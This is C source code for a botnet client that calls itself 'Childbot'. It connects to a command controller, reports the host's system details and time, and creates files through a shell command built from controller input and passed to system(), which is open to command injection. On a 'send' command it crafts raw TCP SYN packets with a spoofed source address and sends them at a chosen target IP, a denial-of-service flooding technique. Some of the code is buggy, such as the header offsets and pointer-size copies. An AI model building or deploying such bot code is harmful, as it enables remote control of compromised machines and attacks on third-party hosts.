#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/utsname.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <errno.h>

struct pseudohdr {
    u_int32_t src_addr;
    u_int32_t dst_addr;
    u_int8_t padding;
    u_int8_t proto;
    u_int16_t length;
};

struct data_4_checksum {
    struct pseudohdr pshd;
    struct tcphdr tcphdr;
    char payload[1024];
};

unsigned short comp_chksum(unsigned short *addr, int len) {
    long sum = 0;

    while (len > 1) {
        sum += *(addr++);
        len -= 2;
    }

    if (len > 0)
        sum += *addr;

    while (sum >> 16)
        sum = ((sum & 0xffff) + (sum >> 16));

    sum = ~sum;

    return ((u_short) sum);

}

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char **argv)
{
    int client_len;
    int client_sockfd;
    int sender_sockfd;
    int i;
    int nread;
    int packet_num;
    char id[2];
    char bot_number[2];
    char buf_in[255];
    char buf_get[255];
    char message[255];
    char instruction[255];
    char read_option[255];
    char route[255];
    char makefile[255];
    char hostname[255];
    char date[255];
    char ip_addr[255];
    char *temp;
    char packet_message[255];

    int sock, bytes, on = 1;
    int checksum;
    char buffer[1024];
    struct iphdr *ip;
    struct tcphdr *tcp;
    struct sockaddr_in to;
    struct pseudohdr pseudoheader;
    struct data_4_checksum tcp_chk_construct;

    FILE *fp;
    struct sockaddr_in clientaddr;
    struct utsname buf;

    uname(&buf);
    time_t now;
    client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
    clientaddr.sin_family = AF_INET;
    clientaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    clientaddr.sin_port = htons(atoi(argv[2]));

    client_len = sizeof(clientaddr);

    if(connect(client_sockfd, (struct sockaddr *)&clientaddr, client_len) < 0)
        error("Connect error : ");
   

   sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1) {
        perror("socket() failed");
        return 1;
    }else{
        printf("socket() ok\n");
    }

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1) {
        perror("setsockopt() failed");
        return 2;
    }else{
        printf("setsockopt() ok\n");
    }

    ip = (struct iphdr*) buffer;
    tcp = (struct tcphdr*) (buffer + sizeof(struct tcphdr));

    int iphdrlen = sizeof(struct iphdr);
    int tcphdrlen = sizeof(struct tcphdr);
    int datalen = 0;


   strncpy(id,argv[1],2);

   write(client_sockfd,id,2);

   while(1)
   {
       memset(buf_get,'\0',255);
       memset(message,'\0',255);
       memset(route,'\0',255);
       memset(makefile,'\0',255);
       memset(date,'\0',255);
       if(read(client_sockfd,buf_get,255) <= 0)
       {
           close(client_sockfd);
           exit(1);
       }

       else if(strlen(buf_get) >= 2)
       {
           printf("%s\n",buf_get);
           strncpy(message,buf_get,sizeof(buf_get)-1);
           temp = strtok(message," ");
           strncpy(instruction,temp,sizeof(temp));
    
           if(strstr(instruction,"read"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,sizeof(temp));

               if(bot_number[0] == id[0] && bot_number[1] == id[1])
               {
                   temp = strtok(NULL," ");
                   strncpy(read_option,temp,sizeof(temp));
                   if(strstr(read_option,"host"))
                   {
                       sprintf(hostname,"Childbot #%c%c : %s:%s:%s:%s:%s",id[0],id[1],buf.sysname,buf.nodename,buf.release,buf.version,buf.machine);
                       write(client_sockfd,hostname,sizeof(hostname));
                   }
                   else if(strstr(read_option,"date"))
                   {
                       time(&now);
                       sprintf(date,"Childbot #%c%c : %s",id[0],id[1],ctime(&now));
                       write(client_sockfd,date,sizeof(date));
                   }
               }
           }
           else if(strstr(instruction,"create"))
           {
               temp = strtok(NULL," ");
               strncpy(bot_number,temp,sizeof(temp));

               if(bot_number[0] == id[0] && bot_number[1] == id[1])
               {
                   temp = strtok(NULL," ");
                   strncpy(route,temp,sizeof(route));
                   for(i=0;i<sizeof(route);i++)
                   {
                       if(route[i] == '\n')
                       {
                           route[i] = '\0';
                           break;
                       }
                   }
                   sprintf(makefile,"touch %s",route);
    
                   if(system(makefile) == 0)
                   {
                       if((fp = fopen(route,"a"))==NULL)
                       {
                           write(client_sockfd,"writing file failed",19);
                           break;
                       }
                       fprintf(fp,"Childbot #%c%c\n",id[0],id[1]);
                       write(client_sockfd,"writing file complete",21);
                       fclose(fp);
                   }
                   else
                       write(client_sockfd,"file creation fail",18);
               }
          }
          else if(strstr(instruction,"send"))
          {
              memset(ip_addr,'\0',255);
              temp = strtok(NULL," ");
              packet_num = atoi(temp);
              temp = strtok(NULL," ");
              strncpy(ip_addr,temp,sizeof(ip_addr));

              ip->frag_off = 0;
              ip->version = 4;
              ip->ihl = 5;
              ip->tot_len = htons(iphdrlen + tcphdrlen);
              ip->id = 0;
              ip->ttl = 40;
              ip->protocol = IPPROTO_TCP;
              ip->saddr = inet_addr("192.168.0.1");
              ip->daddr = inet_addr(ip_addr);
              ip->check = 0;

              tcp->source     = htons(4444);
              tcp->dest       = htons(80);
              tcp->seq        = random();
              tcp->doff       = 5;
              tcp->ack        = 0;
              tcp->psh        = 0;
              tcp->rst        = 0;
              tcp->urg        = 0;
              tcp->syn        = 1;
              tcp->fin        = 0;
              tcp->window     = htons(65535);

              pseudoheader.src_addr = ip->saddr;
              pseudoheader.dst_addr = ip->daddr;
              pseudoheader.padding = 0;
              pseudoheader.proto = ip->protocol;
              pseudoheader.length = htons(tcphdrlen + datalen);

              tcp_chk_construct.pshd = pseudoheader;
              tcp_chk_construct.tcphdr = *tcp;

              checksum = comp_chksum((unsigned short*) &tcp_chk_construct,sizeof(struct pseudohdr) + tcphdrlen + datalen);

              tcp->check = checksum;

              printf("TCP Checksum: %i\n", checksum);
              printf("Destination : %i\n", ntohs(tcp->dest));
              printf("Source: %i\n", ntohs(tcp->source));

              to.sin_addr.s_addr = ip->daddr;
              to.sin_family = AF_INET;
              to.sin_port = tcp->dest;

              bytes = sendto(sock, buffer, ntohs(ip->tot_len), 0, (struct sockaddr*)&to,sizeof(to));

              if (bytes == -1) {
                  perror("sendto() failed");
                  return 1;
              }

              recv(sock, buffer, sizeof(buffer), 0);
              printf("TTL= %d\n", ip->ttl);
              printf("Window= %d\n", tcp->window);
              printf("ACK= %d\n", tcp->ack);
              printf("%s:%d\t --> \t%s:%d \tSeq: %d \tAck: %d\n",
                              inet_ntoa(*(struct in_addr*) &ip->saddr), ntohs(tcp->source),
                              inet_ntoa(*(struct in_addr *) &ip->daddr), ntohs(tcp->dest),
                              ntohl(tcp->seq), ntohl(tcp->ack_seq));

          }  
       }
   }
   return 0;
}

